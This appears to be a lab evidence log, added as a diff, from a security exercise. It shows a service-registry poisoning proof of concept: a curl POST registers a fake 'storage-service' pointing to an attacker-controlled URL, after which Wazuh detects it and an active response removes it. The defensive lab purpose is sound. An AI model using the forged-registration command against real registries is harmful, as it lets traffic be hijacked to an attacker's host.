@@ -1,0 +1,80 @@
+lucas@ssle:~$ incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | tee ~/evidencia/poc1-resposta-final/01-antes.json
+{"failures":0,"instance_id":"pt.centro.dc-incus.k3s.k3s-node1.storage-service.storage-f6f4dbd-lvwth","last_seen":"2026-11-13T21:53:09.309851+00:00","location":{"country":"pt","datacenter":"dc-incus","node":"k3s-node1","rack":"k3s","region":"centro"},"registered_at":"2026-11-13T14:18:59.121120+00:00","url":"http://10.42.1.103:5002"}
+lucas@ssle:~$ incus exec attacker -- curl -s -X POST "http://$MASTER:30050/register" -H "Content-Type: application/json" -d '{"name":"storage-service","url":"http://10.255.255.184:9999","instance_id":"xx.evil.ultimate.storage-service.pwnedB","location":{"country":"xx"}}' | tee ~/evidencia/poc1-resposta-final/02-ataque.json
+{"message":"xx.evil.ultimate.storage-service.pwnedB registered"}
+lucas@ssle:~$ incus exec wazuh-container -- grep -B5 "ultimate" /var/ossec/logs/alerts/alerts.log | grep "Rule:" | tee ~/evidencia/poc1-resposta-final/03-wazuh-deteccao.txt
+Rule: 100102 (level 12) -> 'SSLE: registo malicioso de storage-service (nó desconhecido)'
+lucas@ssle:~$ incus exec wazuh-container -- tail -5 /var/ossec/logs/active-responses.log | tee ~/evidencia/poc1-resposta-final/04-active-response.txt
+removed instance: xx.evil.rule102.storage-service.pwnedD
+{"error":"Not found"}
+removed instance: storage-service
+{"message":"unregistered"}
+removed instance: xx.evil.ultimate.storage-service.pwnedB
+lucas@ssle:~$ incus exec attacker -- curl -s "http://$MASTER:30050/services" | python3 -m json.tool | tee ~/evidencia/poc1-resposta-final/05-depois.json
+{
+    "analytics-service": {
+        "pt.centro.dc-incus.k3s.k3s-node1.analytics-service.analytics-89cb754f6-f4tjc": {
+            "failures": 0,
+            "instance_id": "pt.centro.dc-incus.k3s.k3s-node1.analytics-service.analytics-89cb754f6-f4tjc",
+            "last_seen": "2026-11-13T21:54:59.532657+00:00",
+            "location": {
+                "country": "pt",
+                "datacenter": "dc-incus",
+                "node": "k3s-node1",
+                "rack": "k3s",
+                "region": "centro"
+            },
+            "registered_at": "2026-11-13T14:18:58.816470+00:00",
+            "url": "http://10.42.1.102:5003"
+        }
+    },
+    "ingestion-service": {
+        "pt.centro.dc-incus.k3s.k3s-master.ingestion-service.ingestion-55dcf5c8f-qsxxl": {
+            "failures": 0,
+            "instance_id": "pt.centro.dc-incus.k3s.k3s-master.ingestion-service.ingestion-55dcf5c8f-qsxxl",
+            "last_seen": "2026-11-13T21:54:59.535668+00:00",
+            "location": {
+                "country": "pt",
+                "datacenter": "dc-incus",
+                "node": "k3s-master",
+                "rack": "k3s",
+                "region": "centro"
+            },
+            "registered_at": "2026-11-13T14:18:58.946016+00:00",
+            "url": "http://10.42.0.104:5001"
+        },
+        "pt.centro.dc-incus.k3s.k3s-node1.ingestion-service.ingestion-55dcf5c8f-bdt74": {
+            "failures": 0,
+            "instance_id": "pt.centro.dc-incus.k3s.k3s-node1.ingestion-service.ingestion-55dcf5c8f-bdt74",
+            "last_seen": "2026-11-13T21:54:59.539582+00:00",
+            "location": {
+                "country": "pt",
+                "datacenter": "dc-incus",
+                "node": "k3s-node1",
+                "rack": "k3s",
+                "region": "centro"
+            },
+            "registered_at": "2026-11-13T14:18:59.052858+00:00",
+            "url": "http://10.42.1.101:5001"
+        }
+    },
+    "storage-service": {
+        "pt.centro.dc-incus.k3s.k3s-node1.storage-service.storage-f6f4dbd-lvwth": {
+            "failures": 0,
+            "instance_id": "pt.centro.dc-incus.k3s.k3s-node1.storage-service.storage-f6f4dbd-lvwth",
+            "last_seen": "2026-11-13T21:54:59.544657+00:00",
+            "location": {
+                "country": "pt",
+                "datacenter": "dc-incus",
+                "node": "k3s-node1",
+                "rack": "k3s",
+                "region": "centro"
+            },
+            "registered_at": "2026-11-13T14:18:59.121120+00:00",
+            "url": "http://10.42.1.103:5002"
+        }
+    }
+}
+lucas@ssle:~$ incus exec k3s-master -- grep "ultimate" /var/log/registry-stream.log | tee ~/evidencia/poc1-resposta-final/06-zabbix-log.txt
+[+] xx.evil.ultimate.storage-service.pwnedB -> http://10.255.255.184:9999
+[-] xx.evil.ultimate.storage-service.pwnedB unregistered
